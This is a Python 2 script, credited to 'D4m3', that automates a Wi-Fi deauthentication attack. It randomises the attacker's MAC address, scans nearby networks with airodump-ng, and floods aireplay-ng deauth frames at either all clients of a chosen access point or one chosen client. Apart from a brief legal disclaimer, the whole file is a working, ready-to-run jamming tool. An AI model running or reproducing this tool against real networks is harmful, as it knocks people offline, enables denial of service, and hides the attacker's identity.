import os, sys, time, subprocess, datetime
from scapy.all import *
from pyfiglet import Figlet



################################################
#Template
###############################################
def template():
	f = Figlet(font='epic')
	g = Figlet(font='straight')
	os.system('clear')
	print f.renderText('Wifi Jammer')
	print g.renderText('Coded by D4m3')
	print("DO NOT USE FOR ILLEGAL PURPOSES")
	print ('\nAutomated Wifi Jammer Tool')
	print ('')
	
	
	
################################################	
#set the interface to monitor mode
################################################
def startMonitor():
	try:
		os.system('airmon-ng')
		interface = raw_input('\nChose the interface you want to use: ')
		subprocess.call('ifconfig {} down'.format(interface), shell=True)
		print('\n Randomizing your MAC adress')
		os.system('macchanger -r ' + interface)  #restore permanent mac adress
		subprocess.call('iwconfig {} mode monitor'.format(interface), shell=True)
		subprocess.call('ifconfig {} up'.format(interface), shell=True)
		time.sleep(3)
		
	except:
		main()
	
	
################################################
#Stop the monitor mode on the interface
################################################	
def stopMonitor():
	try:
		subprocess.call('ifconfig {} down'.format(interface), shell=True)
		print('\nRestoring your MAC adress')
		os.system('macchanger -p ' + interface)  #restore permanent mac adress
		subprocess.call('iwconfig {} mode managed'.format(interface), shell=True)
		subprocess.call('ifconfig {} up'.format(interface), shell=True)
		time.sleep(3)
		
	except:
		main()


#############################################
#Jamm all Clientes in a single network
##############################################	
def jamAllCli():
	startMonitor()
	
	#send the interface name to the variable in case it added 'mon' to the end of the interface
	check = subprocess.Popen('ifconfig | grep -i "wlan"', shell=True, stdout=subprocess.PIPE, )
	checkOut= check.communicate()[0]
	interface, garbage = checkOut.split(":")
	
	#show the user the available networks
	try:
		subprocess.call('airodump-ng {}'.format(interface), shell=True)
		
	except KeyboardInterrupt:
		print('\n')
		
		BSSID = raw_input('Enter the BSSID/MAC address of the AP: ')
		ch = raw_input('Target channel: ')
		
	try:	
		subprocess.call('airodump-ng -c {} --bssid {} {}'.format(ch, BSSID, interface), shell=True)
	except KeyboardInterrupt:
		print('\n')
	
	template()
	print('Starting Jammer...')
	time.sleep(1)
	
	#Start the jammer
	try:
		#cu = 'aireplay-ng --deauth 999 -a ' + BSSID + '-c ff:ff:ff:ff:ff:ff ' + 
		os.system('aireplay-ng --deauth 999 -a ' + BSSID + ' -c ff:ff:ff:ff:ff:ff ' + interface)
		
	except KeyboardInterrupt:
		time.sleep(2)
		print('Cleaning up...')
		stopMonitor()
		main()
		
		
	
####################################################
#Jamm a single Client from the network
###################################################
def jam1Cli():
	startMonitor()
	
	#send the interface name to the variable in case it added 'mon' to the end of the interface
	check = subprocess.Popen('ifconfig | grep -i "wlan"', shell=True, stdout=subprocess.PIPE, )
	checkOut= check.communicate()[0]
	interface, garbage = checkOut.split(":")
	
	#show the user the available networks
	try:
		subprocess.call('airodump-ng {}'.format(interface), shell=True)
		
	except KeyboardInterrupt:
		print('\n')
	
	
	
	BSSID = raw_input('Enter the BSSID/MAC address of the AP: ')
	
	try:
		subprocess.call('airodump-ng --bssid {} {}'.format(BSSID, interface), shell=True)
	
	except KeyboardInterrupt:
		print('\n')
		
	Client = raw_input('Enter the BSSID/MAC address of the Client: ')
	
	
	template()
	print('Starting Jammer...')
	time.sleep(1)
	
	#Start the jammer
	try:
		subprocess.call('aireplay-ng --deauth 99999 -a {} -c {} -D {}'.format(BSSID, Client, interface), shell=True)
		
	except KeyboardInterrupt:
		print('Cleaning up...')
		stopMonitor()
		main()
	
	
def wifijam():
	template()
	print("  Where do you wanna go")
	print("\n  [1] Deauth Single Client\n  [2] Deauthenticate All Clients\n  [3] Quit")
	inp = raw_input("\n  --->  ")
	if inp == '1':
		jam1Cli()
		
	elif inp == '2':
		jamAllCli()
		
	elif inp == '3':
		main()
	
	else:
		print("  Invalid input..")
		time.sleep(2)
		wifijam()
		
	
def LegalInfo():
	template()
	print('Do not use this tool for illegal purposes!')
	print("Jamming a network is strictly illegal in most countries.")
	print("Do not use this tool in a network that is not owned by you.")
	print('The creator of this script will not accept responsibility for your actions!')
	print("\n Press 'q' to go back.")
	inp = raw_input("\n  --->  ")
	
	if inp == 'q':
		main()
		
	else:
		print("  Invalid input..")
		time.sleep(2)
		LegalInfo()
	

def Credits():
	template()
	print("This Script was created by D4m3.")
	print("\n  Press 'q' to go back to main menu...")
	inp = raw_input("\n  --->  ")
	if inp == 'q':
		main()
		
	else:
		print("  Invalid input..")
		time.sleep(2)
		Credits()
	
	
def main():
	template()
	print("  Where do you wanna go")
	print("\n  [1] Lauch Wifi Jammer\n  [2] Legal Information\n  [3] Credits\n  [4] Quit")
	inp = raw_input("\n  --->  ")
	
	if inp == '1':
		wifijam()
		
	elif inp == '2':
		LegalInfo()
		
	elif inp == '3':
		Credits()
		
	elif inp == '4':
		print("  Closing..")
		time.sleep(2)
		sys.exit()
		
	else:
		print("  Invalid input..")
		time.sleep(2)
		main()
		
main()
